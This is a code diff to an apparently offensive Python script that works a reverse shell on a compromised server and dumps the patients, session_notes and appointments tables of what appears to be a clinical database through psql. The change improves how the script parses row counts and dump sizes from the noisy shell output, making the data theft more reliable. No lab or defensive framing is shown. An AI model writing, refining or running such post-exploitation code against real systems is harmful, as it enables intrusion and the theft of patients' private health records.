@@ -28,6 +28,22 @@ _sentinel_seq = 0
 # Shell helpers
 # ---------------------------------------------------------------------------
 
+def _first_int(raw: str) -> str:
+    """Return the first integer-only line from a _run_remote result.
+
+    Interactive reverse shells interleave echoed input, ANSI prompts, and
+    backspace sequences around the actual command output. Simple splitlines()[-1]
+    grabs the prompt line rather than the numeric result. This helper scans all
+    lines and returns the first one that is a bare integer (e.g. a COUNT(*) or
+    wc -c result).
+    """
+    for line in raw.splitlines():
+        clean = line.replace("\x08", "").strip()
+        if clean.isdigit():
+            return clean
+    return "?"
+
+
 def _drain(shell):
     prev = shell.gettimeout()
     shell.settimeout(0.1)
@@ -153,7 +169,7 @@ def _dump_db(john_shell, creds):
         f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM patients;'",
         timeout=10,
     )
-    row_count = row_count_raw.strip().splitlines()[-1] if row_count_raw.strip() else "?"
+    row_count = _first_int(row_count_raw)
     log(f"[+] patients: {row_count} rows")
 
     log("[*] Dumping session_notes table ...")
@@ -171,7 +187,7 @@ def _dump_db(john_shell, creds):
         f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM session_notes;'",
         timeout=10,
     )
-    notes_count = notes_count_raw.strip().splitlines()[-1] if notes_count_raw.strip() else "?"
+    notes_count = _first_int(notes_count_raw)
     log(f"[+] session_notes: {notes_count} rows")
 
     log("[*] Dumping appointments table ...")
@@ -189,11 +205,11 @@ def _dump_db(john_shell, creds):
         f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM appointments;'",
         timeout=10,
     )
-    appt_count = appt_count_raw.strip().splitlines()[-1] if appt_count_raw.strip() else "?"
+    appt_count = _first_int(appt_count_raw)
     log(f"[+] appointments: {appt_count} rows")
 
     size_raw = _run_remote(john_shell, f"wc -c < {DUMP_PATH} 2>/dev/null || echo 0")
-    size = size_raw.strip().splitlines()[-1].strip() if size_raw.strip() else "0"
+    size = _first_int(size_raw)
     log(f"[+] Dump written to {DUMP_PATH} ({size} bytes)")
 
     return {"patients": row_count, "session_notes": notes_count,
